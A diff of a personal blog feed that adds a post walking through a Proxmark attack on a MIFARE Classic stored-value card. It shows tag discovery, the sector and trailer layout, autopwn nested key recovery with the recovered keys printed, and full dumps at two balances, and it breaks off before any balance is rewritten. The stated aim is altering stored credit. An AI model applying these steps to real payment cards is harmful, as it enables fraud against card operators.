@@ -1,16 +1,642 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="https://fedemengo.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://fedemengo.github.io/" rel="alternate" type="text/html" hreflang="en" /><updated>2026-06-25T22:09:49+00:00</updated><id>https://fedemengo.github.io/feed.xml</id><title type="html">fedemengo</title><entry><title type="html">How I made nvim 300x faster</title><link href="https://fedemengo.github.io/blog/2023/04/nvim-evil-regex/" rel="alternate" type="text/html" title="How I made nvim 300x faster" /><published>2023-04-23T00:00:00+00:00</published><updated>2023-04-23T00:00:00+00:00</updated><id>https://fedemengo.github.io/blog/2023/04/nvim-evil-regex</id><content type="html" xml:base="https://fedemengo.github.io/blog/2023/04/nvim-evil-regex/"><![CDATA[<h2 id="intro">Intro</h2>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="https://fedemengo.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://fedemengo.github.io/" rel="alternate" type="text/html" hreflang="en" /><updated>2026-06-25T23:11:56+00:00</updated><id>https://fedemengo.github.io/feed.xml</id><title type="html">fedemengo</title><entry><title type="html">Money Laundrying</title><link href="https://fedemengo.github.io/blog/2025/10/money-laundrying/" rel="alternate" type="text/html" title="Money Laundrying" /><published>2025-10-12T00:00:00+00:00</published><updated>2025-10-12T00:00:00+00:00</updated><id>https://fedemengo.github.io/blog/2025/10/money-laundrying</id><content type="html" xml:base="https://fedemengo.github.io/blog/2025/10/money-laundrying/"><![CDATA[<h2 id="intro">Intro</h2>
 
-<p>For a while, I’ve been working on a side <a href="https://github.com/fedemengo/d2bist">project</a> that generates files with many 0s and 1s. As nvim is my primary editor, I frequently need to check or modify the contents of these files. However, to my great annoyance, whenever the files contained more than, let’s say, tens of thousands of bit characters, nvim would hang for several seconds, minutes, or until I would SIGKILL it.</p>
+<p>It started with a stored-value card and a very simple question: if the official reader can update the balance, what is stopping me from talking to the same card and writing the same kind of bytes?</p>
 
-<p>This kept happening, so I tried opening the same file with plain vim and to my surprise, the file would open up instantly. There had to be something wrong with my config, I thought. After all, adding more and more plugins to nvim undoubtedly makes the editor heavier and slower. It was time to find out where the problem was.</p>
+<p>So I tried to understand how it worked. The plan was simple: read the card, spend a little, read it again, and compare the two dumps until the balance fell out. This is that little investigation, with just enough MIFARE Classic context to make the block reads, writes, and diffs make sense.</p>
+
+<h2 id="card-discovery">Card discovery</h2>
+
+<p>The first step was simply asking the Proxmark what kind of tag was in front of it. The important parts here are the UID, the detected card family, and the weak PRNG hint, which usually means the card is a good candidate for the standard MIFARE Classic tooling.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>usb] pm3 <span class="nt">--</span><span class="o">&gt;</span> hf search
+ 🕖  Searching <span class="k">for </span>ISO14443-A tag...
+<span class="o">[=]</span> <span class="nt">----------</span> ISO14443-A Information <span class="nt">----------</span>
+<span class="o">[</span>+]  UID: 6C 2F AC 83   <span class="o">(</span> ONUID, re-used <span class="o">)</span>
+<span class="o">[</span>+] ATQA: 00 02
+<span class="o">[</span>+]  SAK: 18 <span class="o">[</span>2]
+<span class="o">[</span>+] Possible types:
+<span class="o">[</span>+]    MIFARE Classic 4K
+<span class="o">[=]</span>
+<span class="o">[=]</span> Proprietary non iso14443-4 card found
+<span class="o">[=]</span> RATS not supported
+<span class="o">[</span>+] Prng detection..... weak
+
+<span class="o">[</span>?] Hint: Try <span class="sb">`</span>hf mf info<span class="sb">`</span>
+
+
+<span class="o">[</span>+] Valid ISO 14443-A tag found
+</code></pre></div></div>
+
+<h2 id="mifare-classic-layout">MIFARE Classic layout</h2>
+
+<p>Before looking at the dump, it helps to keep the MIFARE Classic memory layout in mind. The card is split into sectors, each sector is split into blocks, and every block is 16 bytes. The keys are not attached to a single block: they belong to a whole sector.</p>
+
+<p>For the dump below, the useful mental model is the MIFARE Classic 1K-style layout:</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sector  global blocks  sector-local blocks  notes
+------  -------------  -------------------  -----------------------------------------
+0       0-3            0-3                  block 0 is the manufacturer block
+1       4-7            0-3                  blocks 4-6 are data, block 7 is trailer
+2       8-11           0-3                  blocks 8-10 are data, block 11 is trailer
+...     ...            ...                  same pattern
+15      60-63          0-3                  blocks 60-62 are data, block 63 is trailer
+</code></pre></div></div>
+
+<p>MIFARE Classic 4K cards extend this layout with more sectors. The first 32 sectors still have 4 blocks each; the larger sectors after that have 16 blocks each, with the last block of each sector still acting as the trailer. The dump I am looking at here only shows the first 16 sectors, so the simple 4-block-per-sector model is enough for the rest of this post.</p>
+
+<p>So when the dump says <code class="language-plaintext highlighter-rouge">sec 2 | blk 8</code>, it means global block <code class="language-plaintext highlighter-rouge">8</code>, which is block <code class="language-plaintext highlighter-rouge">0</code> inside sector <code class="language-plaintext highlighter-rouge">2</code>. The last block of the sector is the sector trailer. For sector <code class="language-plaintext highlighter-rouge">2</code>, that is block <code class="language-plaintext highlighter-rouge">11</code>.</p>
+
+<p>The sector trailer is special:</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bytes 0..5    key A
+bytes 6..8    access bits
+byte  9       general purpose byte
+bytes 10..15  key B
+</code></pre></div></div>
+
+<p>The access bits define what key is needed to read or write each block in that sector. In the common simple case, key A can read data blocks and key B can write them, while the trailer itself controls the keys and permissions. That is why the key table printed by <code class="language-plaintext highlighter-rouge">autopwn</code> shows one key A and one key B per sector trailer block:</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Sec 2, trailer block 11:
+key A = A49F68AB4733
+key B = B4E109EC9C52
+</code></pre></div></div>
+
+<p>Those are the keys for the whole sector, not just block <code class="language-plaintext highlighter-rouge">11</code>. So for this card, any access to blocks <code class="language-plaintext highlighter-rouge">8</code>, <code class="language-plaintext highlighter-rouge">9</code>, and <code class="language-plaintext highlighter-rouge">10</code> depends on the sector <code class="language-plaintext highlighter-rouge">2</code> keys and the permissions encoded in the sector trailer.</p>
+
+<p>In practice, the key choice comes from the trailer’s access bits:</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>operation                  which key?
+-------------------------  ----------------------------------------------------------
+read a data block          whichever of key A or key B the access bits allow
+write a data block         whichever of key A or key B the access bits allow
+change sector permissions  authenticate to the trailer with a key allowed to write it
+change key A or key B      write the sector trailer, not the data blocks
+</code></pre></div></div>
+
+<p>As a rule of thumb: data lives in the data blocks, permissions and keys live in the trailer. Trailer blocks can be rewritten like any other block, as long as the current access bits allow it. The catch is that once a trailer is overwritten, the new keys and access bits immediately define what can be read or written next, so a bad trailer write can lock you out of the sector with the keys you have.</p>
+
+<p>With that layout in mind, <code class="language-plaintext highlighter-rouge">hf mf info</code> gives a compact summary of the card and checks whether any obvious default keys work. In this case, sector 0 is readable with the default <code class="language-plaintext highlighter-rouge">FFFFFFFFFFFF</code> key, which is enough to get started.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>usb] pm3 <span class="nt">--</span><span class="o">&gt;</span> hf mf info
+
+<span class="o">[=]</span> <span class="nt">---</span> ISO14443-a Information <span class="nt">-----------------------------</span>
+<span class="o">[</span>+]  UID: 6C 2F AC 83
+<span class="o">[</span>+] ATQA: 00 02
+<span class="o">[</span>+]  SAK: 18 <span class="o">[</span>1]
+
+<span class="o">[=]</span> <span class="nt">---</span> Keys Information
+<span class="o">[</span>+] loaded 2 user keys
+<span class="o">[</span>+] loaded 61 hardcoded keys
+<span class="o">[</span>+] Sector 0 key A... FFFFFFFFFFFF
+<span class="o">[</span>+] Sector 0 key B... FFFFFFFFFFFF
+<span class="o">[</span>+] Backdoor key..... same as key A/B
+<span class="o">[</span>+] Block 0.......... 6C2FAC836C980200E08E3D1955102213 | .<span class="o">=</span>.U.<span class="se">\"</span><span class="nb">.</span>
+
+<span class="o">[=]</span> <span class="nt">---</span> Fingerprint
+<span class="o">[</span>+] n/a
+
+<span class="o">[=]</span> <span class="nt">---</span> Magic Tag Information
+<span class="o">[=]</span> &lt;n/a&gt;
+
+<span class="o">[=]</span> <span class="nt">---</span> PRNG Information
+<span class="o">[</span>+] Prng....... weak
+</code></pre></div></div>
+
+<p>Before touching the card, I took note of the visible balance. This first snapshot is the baseline I want to recover from the binary dump.</p>
+
+<figure>
+
+  <picture>
+    
+    <source class="responsive-img-srcset" media="(max-width: 480px)" srcset="/assets/img/blog/2025-10-12/1250-480.webp" />
+    <source class="responsive-img-srcset" media="(max-width: 800px)" srcset="/assets/img/blog/2025-10-12/1250-800.webp" />
+    <source class="responsive-img-srcset" media="(max-width: 1400px)" srcset="/assets/img/blog/2025-10-12/1250-1400.webp" />
+    
+
+    <!-- Fallback to the original file -->
+    <img src="/assets/img/blog/2025-10-12/1250.png" class="img-fluid centered" width="auto" height="auto" data-zoomable="" onerror="this.onerror=null; $('.responsive-img-srcset').remove();" />
+
+  </picture><figcaption class="caption">Initial credit value: 12.50</figcaption>
+
+</figure>
+
+<p>The next step was to recover enough sector keys to read the full memory. <code class="language-plaintext highlighter-rouge">autopwn</code> tries the usual MIFARE Classic attacks and dictionaries, then prints a useful table: one row per sector trailer, with the recovered key A and key B for that sector. It also dumps the card at the end, so this gives me the first binary snapshot of the card at <code class="language-plaintext highlighter-rouge">12.50</code>.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>usb] pm3 <span class="nt">--</span><span class="o">&gt;</span> hf mf autopwn
+
+<span class="o">[!]</span> ⚠️   Known key failed. Can<span class="se">\'</span>t authenticate to block   0 key <span class="nb">type </span>A
+<span class="o">[!]</span> ⚠️   No known key was supplied, key recovery might fail
+<span class="o">[</span>+] loaded 5 user keys
+<span class="o">[</span>+] loaded 61 hardcoded keys
+<span class="o">[=]</span> Running strategy 1
+<span class="o">[=]</span> Running strategy 2
+<span class="o">[=]</span> <span class="nb">.</span>
+<span class="o">[</span>+] Target sector   0 key <span class="nb">type </span>A <span class="nt">--</span> found valid key <span class="o">[</span> FFFFFFFFFFFF <span class="o">]</span> <span class="o">(</span>used <span class="k">for </span>nested / hardnested attack<span class="o">)</span>
+<span class="o">[</span>+] Target sector   0 key <span class="nb">type </span>B <span class="nt">--</span> found valid key <span class="o">[</span> FFFFFFFFFFFF <span class="o">]</span>
+<span class="o">[</span>+] Target sector   3 key <span class="nb">type </span>A <span class="nt">--</span> found valid key <span class="o">[</span> FFFFFFFFFFFF <span class="o">]</span>
+<span class="o">[</span>+] Target sector   3 key <span class="nb">type </span>B <span class="nt">--</span> found valid key <span class="o">[</span> FFFFFFFFFFFF <span class="o">]</span>
+<span class="o">[</span>+] Target sector   4 key <span class="nb">type </span>A <span class="nt">--</span> found valid key <span class="o">[</span> FFFFFFFFFFFF <span class="o">]</span>
+<span class="o">[</span>+] Target sector   4 key <span class="nb">type </span>B <span class="nt">--</span> found valid key <span class="o">[</span> FFFFFFFFFFFF <span class="o">]</span>
+<span class="o">[</span>+] Target sector   5 key <span class="nb">type </span>A <span class="nt">--</span> found valid key <span class="o">[</span> FFFFFFFFFFFF <span class="o">]</span>
+<span class="o">[</span>+] Target sector   5 key <span class="nb">type </span>B <span class="nt">--</span> found valid key <span class="o">[</span> FFFFFFFFFFFF <span class="o">]</span>
+<span class="o">[</span>+] Target sector   6 key <span class="nb">type </span>A <span class="nt">--</span> found valid key <span class="o">[</span> FFFFFFFFFFFF <span class="o">]</span>
+<span class="o">[</span>+] Target sector   6 key <span class="nb">type </span>B <span class="nt">--</span> found valid key <span class="o">[</span> FFFFFFFFFFFF <span class="o">]</span>
+<span class="o">[</span>+] Target sector   7 key <span class="nb">type </span>A <span class="nt">--</span> found valid key <span class="o">[</span> FFFFFFFFFFFF <span class="o">]</span>
+<span class="o">[</span>+] Target sector   7 key <span class="nb">type </span>B <span class="nt">--</span> found valid key <span class="o">[</span> FFFFFFFFFFFF <span class="o">]</span>
+<span class="o">[</span>+] Target sector   8 key <span class="nb">type </span>A <span class="nt">--</span> found valid key <span class="o">[</span> FFFFFFFFFFFF <span class="o">]</span>
+<span class="o">[</span>+] Target sector   8 key <span class="nb">type </span>B <span class="nt">--</span> found valid key <span class="o">[</span> FFFFFFFFFFFF <span class="o">]</span>
+<span class="o">[</span>+] Target sector   9 key <span class="nb">type </span>A <span class="nt">--</span> found valid key <span class="o">[</span> FFFFFFFFFFFF <span class="o">]</span>
+<span class="o">[</span>+] Target sector   9 key <span class="nb">type </span>B <span class="nt">--</span> found valid key <span class="o">[</span> FFFFFFFFFFFF <span class="o">]</span>
+<span class="o">[</span>+] Target sector  10 key <span class="nb">type </span>A <span class="nt">--</span> found valid key <span class="o">[</span> FFFFFFFFFFFF <span class="o">]</span>
+<span class="o">[</span>+] Target sector  10 key <span class="nb">type </span>B <span class="nt">--</span> found valid key <span class="o">[</span> FFFFFFFFFFFF <span class="o">]</span>
+<span class="o">[</span>+] Target sector  11 key <span class="nb">type </span>A <span class="nt">--</span> found valid key <span class="o">[</span> FFFFFFFFFFFF <span class="o">]</span>
+<span class="o">[</span>+] Target sector  11 key <span class="nb">type </span>B <span class="nt">--</span> found valid key <span class="o">[</span> FFFFFFFFFFFF <span class="o">]</span>
+<span class="o">[</span>+] Target sector  12 key <span class="nb">type </span>A <span class="nt">--</span> found valid key <span class="o">[</span> FFFFFFFFFFFF <span class="o">]</span>
+<span class="o">[</span>+] Target sector  12 key <span class="nb">type </span>B <span class="nt">--</span> found valid key <span class="o">[</span> FFFFFFFFFFFF <span class="o">]</span>
+<span class="o">[</span>+] Target sector  13 key <span class="nb">type </span>A <span class="nt">--</span> found valid key <span class="o">[</span> FFFFFFFFFFFF <span class="o">]</span>
+<span class="o">[</span>+] Target sector  13 key <span class="nb">type </span>B <span class="nt">--</span> found valid key <span class="o">[</span> FFFFFFFFFFFF <span class="o">]</span>
+<span class="o">[</span>+] Target sector  14 key <span class="nb">type </span>A <span class="nt">--</span> found valid key <span class="o">[</span> FFFFFFFFFFFF <span class="o">]</span>
+<span class="o">[</span>+] Target sector  14 key <span class="nb">type </span>B <span class="nt">--</span> found valid key <span class="o">[</span> FFFFFFFFFFFF <span class="o">]</span>
+<span class="o">[</span>+] Target sector  15 key <span class="nb">type </span>A <span class="nt">--</span> found valid key <span class="o">[</span> FFFFFFFFFFFF <span class="o">]</span>
+<span class="o">[</span>+] Target sector  15 key <span class="nb">type </span>B <span class="nt">--</span> found valid key <span class="o">[</span> FFFFFFFFFFFF <span class="o">]</span>
+
+<span class="o">[</span>+] Found 1 key candidate
+<span class="o">[</span>+] Target block    4 key <span class="nb">type </span>A <span class="nt">--</span> found valid key <span class="o">[</span> A71A0C3102FD <span class="o">]</span>
+<span class="o">[</span>+] Target sector   1 key <span class="nb">type </span>A <span class="nt">--</span> found valid key <span class="o">[</span> A71A0C3102FD <span class="o">]</span>
+
+<span class="o">[</span>+] Found 1 key candidate
+<span class="o">[</span>+] Target block    4 key <span class="nb">type </span>B <span class="nt">--</span> found valid key <span class="o">[</span> B76198135BD9 <span class="o">]</span>
+<span class="o">[</span>+] Target sector   1 key <span class="nb">type </span>B <span class="nt">--</span> found valid key <span class="o">[</span> B76198135BD9 <span class="o">]</span>
+
+<span class="o">[</span>+] Found 1 key candidate
+<span class="o">[</span>+] Target block    8 key <span class="nb">type </span>A <span class="nt">--</span> found valid key <span class="o">[</span> A49F68AB4733 <span class="o">]</span>
+<span class="o">[</span>+] Target sector   2 key <span class="nb">type </span>A <span class="nt">--</span> found valid key <span class="o">[</span> A49F68AB4733 <span class="o">]</span>
+
+<span class="o">[</span>+] Target block    8 key <span class="nb">type </span>B
+<span class="o">[</span>-] ⛔ Nested attack failed, trying again <span class="o">(</span>1/6<span class="o">)</span>
+<span class="o">[</span>+] Found 1 key candidate
+<span class="o">[</span>+] Target block    8 key <span class="nb">type </span>B <span class="nt">--</span> found valid key <span class="o">[</span> B4E109EC9C52 <span class="o">]</span>
+<span class="o">[</span>+] Target sector   2 key <span class="nb">type </span>B <span class="nt">--</span> found valid key <span class="o">[</span> B4E109EC9C52 <span class="o">]</span>
+
+<span class="o">[</span>+] <span class="nt">-----</span>+-----+--------------+---+--------------+----
+<span class="o">[</span>+]  Sec | Blk | key A        |res| key B        |res
+<span class="o">[</span>+] <span class="nt">-----</span>+-----+--------------+---+--------------+----
+<span class="o">[</span>+]  000 | 003 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
+<span class="o">[</span>+]  001 | 007 | A71A0C3102FD | N | B76198135BD9 | N
+<span class="o">[</span>+]  002 | 011 | A49F68AB4733 | N | B4E109EC9C52 | N
+<span class="o">[</span>+]  003 | 015 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
+<span class="o">[</span>+]  004 | 019 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
+<span class="o">[</span>+]  005 | 023 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
+<span class="o">[</span>+]  006 | 027 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
+<span class="o">[</span>+]  007 | 031 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
+<span class="o">[</span>+]  008 | 035 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
+<span class="o">[</span>+]  009 | 039 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
+<span class="o">[</span>+]  010 | 043 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
+<span class="o">[</span>+]  011 | 047 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
+<span class="o">[</span>+]  012 | 051 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
+<span class="o">[</span>+]  013 | 055 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
+<span class="o">[</span>+]  014 | 059 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
+<span class="o">[</span>+]  015 | 063 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
+<span class="o">[</span>+] <span class="nt">-----</span>+-----+--------------+---+--------------+----
+<span class="o">[=]</span> <span class="o">(</span> D:Dictionary / S:darkSide / U:User / R:Reused / N:Nested / H:Hardnested / C:statiCnested / A:keyA  <span class="o">)</span>
+
+
+<span class="o">[</span>+] Generating binary key file
+<span class="o">[</span>+] Found keys have been dumped to <span class="sb">`</span>~/hf-mf-6C2FAC83-key.bin<span class="sb">`</span>
+<span class="o">[=]</span> <span class="nt">--</span><span class="o">[</span> FFFFFFFFFFFF <span class="o">]</span><span class="nt">--</span> has been inserted <span class="k">for </span>unknown keys where res is 0
+<span class="o">[=]</span> Transferring keys to simulator memory <span class="o">(</span> ok <span class="o">)</span>
+<span class="o">[=]</span> Dumping card content to emulator memory <span class="o">(</span>Cmd Error: 04 can occur<span class="o">)</span>
+<span class="o">[=]</span> downloading card content from emulator memory
+<span class="o">[</span>+] Saved 1024 bytes to binary file <span class="sb">`</span>~/hf-mf-6C2FAC83-dump.bin<span class="sb">`</span>
+<span class="o">[</span>+] Saved to json file ~/hf-mf-6C2FAC83-dump.json
+<span class="o">[=]</span> Autopwn execution <span class="nb">time</span>: 9 seconds
+</code></pre></div></div>
+
+<p>Then I used the card normally and spent some credit. The visible balance moved from <code class="language-plaintext highlighter-rouge">12.50</code> to <code class="language-plaintext highlighter-rouge">9.00</code>, which gives me a clean before/after pair to compare.</p>
+
+<figure>
+
+  <picture>
+    
+    <source class="responsive-img-srcset" media="(max-width: 480px)" srcset="/assets/img/blog/2025-10-12/0900-480.webp" />
+    <source class="responsive-img-srcset" media="(max-width: 800px)" srcset="/assets/img/blog/2025-10-12/0900-800.webp" />
+    <source class="responsive-img-srcset" media="(max-width: 1400px)" srcset="/assets/img/blog/2025-10-12/0900-1400.webp" />
+    
+
+    <!-- Fallback to the original file -->
+    <img src="/assets/img/blog/2025-10-12/0900.png" class="img-fluid centered" width="auto" height="auto" data-zoomable="" onerror="this.onerror=null; $('.responsive-img-srcset').remove();" />
+
+  </picture><figcaption class="caption">Credit value after payment: 9.00</figcaption>
+
+</figure>
+
+<p>After spending, I dumped the card again with the keys recovered by <code class="language-plaintext highlighter-rouge">autopwn</code>. This is the second data snapshot: each row is a 16-byte block, with the sector number on the left and the global block number next to it.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="o">[</span>usb] pm3 <span class="nt">--</span><span class="o">&gt;</span> hf mf dump
+<span class="o">[</span>+] Loaded binary key file <span class="sb">`</span>~/hf-mf-6C2FAC83-key.bin<span class="sb">`</span>
+<span class="o">[=]</span> Reading sector access bits...
+<span class="o">[=]</span> .................
+<span class="o">[</span>+] Finished reading sector access bits
+<span class="o">[=]</span> Dumping all blocks from card...
+ 🕙 Sector... 15 block... 3 <span class="o">(</span> ok <span class="o">)</span>
+<span class="o">[</span>+] Succeeded <span class="k">in </span>dumping all blocks
+
+<span class="o">[</span>+] <span class="nb">time</span>: 11 seconds
+
+
+<span class="o">[=]</span> <span class="nt">-----</span>+-----+-------------------------------------------------+-----------------
+<span class="o">[=]</span>  sec | blk | data                                            | ascii
+<span class="o">[=]</span> <span class="nt">-----</span>+-----+-------------------------------------------------+-----------------
+<span class="o">[=]</span>    0 |   0 | 6C 2F AC 83 6C 98 02 00 E0 8E 3D 19 55 10 22 13 | l/..l.....<span class="o">=</span>.U.<span class="se">\"</span><span class="nb">.</span>
+<span class="o">[=]</span>      |   1 | 7B 00 26 88 26 88 00 00 00 00 00 00 00 00 00 00 | <span class="o">{</span>.&amp;.&amp;...........
+<span class="o">[=]</span>      |   2 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+<span class="o">[=]</span>      |   3 | FF FF FF FF FF FF FF 07 80 69 FF FF FF FF FF FF | .........i......
+<span class="o">[=]</span>    1 |   4 | 00 00 71 01 00 00 01 01 03 01 00 00 00 00 00 4E | ..q............N
+<span class="o">[=]</span>      |   5 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0B | ................
+<span class="o">[=]</span>      |   6 | 92 B3 D9 34 00 00 00 00 00 00 00 00 FB 01 00 16 | .4...........
+<span class="o">[=]</span>      |   7 | A7 1A 0C 31 02 FD 78 77 88 00 B7 61 98 13 5B D9 | ...1..xw...a..[.
+<span class="o">[=]</span>    2 |   8 | 84 03 00 00 7B FC FF FF 84 03 00 00 09 F6 09 F6 | ....<span class="o">{</span>........
+<span class="o">[=]</span>      |   9 | 84 03 00 00 7B FC FF FF 84 03 00 00 09 F6 09 F6 | ....<span class="o">{</span>........
+<span class="o">[=]</span>      |  10 | 00 00 00 00 FF FF FF FF 00 00 00 00 0A F5 0A F5 | ..............
+<span class="o">[=]</span>      |  11 | A4 9F 68 AB 47 33 08 77 8F 00 B4 E1 09 EC 9C 52 | ..h.G3.w.......R
+<span class="o">[=]</span>    3 |  12 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+<span class="o">[=]</span>      |  13 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+<span class="o">[=]</span>      |  14 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+<span class="o">[=]</span>      |  15 | FF FF FF FF FF FF FF 07 80 69 FF FF FF FF FF FF | .........i......
+<span class="o">[=]</span>    4 |  16 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+<span class="o">[=]</span>      |  17 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+<span class="o">[=]</span>      |  18 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+<span class="o">[=]</span>      |  19 | FF FF FF FF FF FF FF 07 80 69 FF FF FF FF FF FF | .........i......
+<span class="o">[=]</span>    5 |  20 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+<span class="o">[=]</span>      |  21 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+<span class="o">[=]</span>      |  22 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+<span class="o">[=]</span>      |  23 | FF FF FF FF FF FF FF 07 80 69 FF FF FF FF FF FF | .........i......
+<span class="o">[=]</span>    6 |  24 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+<span class="o">[=]</span>      |  25 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+<span class="o">[=]</span>      |  26 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+<span class="o">[=]</span>      |  27 | FF FF FF FF FF FF FF 07 80 69 FF FF FF FF FF FF | .........i......
+<span class="o">[=]</span>    7 |  28 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+<span class="o">[=]</span>      |  29 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+<span class="o">[=]</span>      |  30 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+<span class="o">[=]</span>      |  31 | FF FF FF FF FF FF FF 07 80 69 FF FF FF FF FF FF | .........i......
+<span class="o">[=]</span>    8 |  32 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+<span class="o">[=]</span>      |  33 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+<span class="o">[=]</span>      |  34 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+<span class="o">[=]</span>      |  35 | FF FF FF FF FF FF FF 07 80 69 FF FF FF FF FF FF | .........i......
+<span class="o">[=]</span>    9 |  36 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+<span class="o">[=]</span>      |  37 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+<span class="o">[=]</span>      |  38 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+<span class="o">[=]</span>      |  39 | FF FF FF FF FF FF FF 07 80 69 FF FF FF FF FF FF | .........i......
+<span class="o">[=]</span>   10 |  40 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+<span class="o">[=]</span>      |  41 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+<span class="o">[=]</span>      |  42 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+<span class="o">[=]</span>      |  43 | FF FF FF FF FF FF FF 07 80 69 FF FF FF FF FF FF | .........i......
+<span class="o">[=]</span>   11 |  44 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+<span class="o">[=]</span>      |  45 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+<span class="o">[=]</span>      |  46 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+<span class="o">[=]</span>      |  47 | FF FF FF FF FF FF FF 07 80 69 FF FF FF FF FF FF | .........i......
+<span class="o">[=]</span>   12 |  48 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+<span class="o">[=]</span>      |  49 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+<span class="o">[=]</span>      |  50 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+<span class="o">[=]</span>      |  51 | FF FF FF FF FF FF FF 07 80 69 FF FF FF FF FF FF | .........i......
+<span class="o">[=]</span>   13 |  52 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+<span class="o">[=]</span>      |  53 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+<span class="o">[=]</span>      |  54 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+<span class="o">[=]</span>      |  55 | FF FF FF FF FF FF FF 07 80 69 FF FF FF FF FF FF | .........i......
+<span class="o">[=]</span>   14 |  56 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+<span class="o">[=]</span>      |  57 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+<span class="o">[=]</span>      |  58 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+<span class="o">[=]</span>      |  59 | FF FF FF FF FF FF FF 07 80 69 FF FF FF FF FF FF | .........i......
+<span class="o">[=]</span>   15 |  60 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+<span class="o">[=]</span>      |  61 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+<span class="o">[=]</span>      |  62 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+<span class="o">[=]</span>      |  63 | FF FF FF FF FF FF FF 07 80 69 FF FF FF FF FF FF | .........i......
+<span class="o">[=]</span> <span class="nt">-----</span>+-----+-------------------------------------------------+-----------------
+
+<span class="o">[</span>+] Saved 1024 bytes to binary file <span class="sb">`</span>~/hf-mf-6C2FAC83-dump-001.bin<span class="sb">`</span>
+<span class="o">[</span>+] Saved to json file ~/hf-mf-6C2FAC83-dump-001.json
+</code></pre></div></div>
+
+<p>At this point I had two dumps from the same card at two different balances: one from <code class="language-plaintext highlighter-rouge">autopwn</code> at <code class="language-plaintext highlighter-rouge">12.50</code>, and one after spending at <code class="language-plaintext highlighter-rouge">9.00</code>. The easiest way to find the stored value is to compare them and look for blocks that change in a way that matches the visible balance.</p>
+
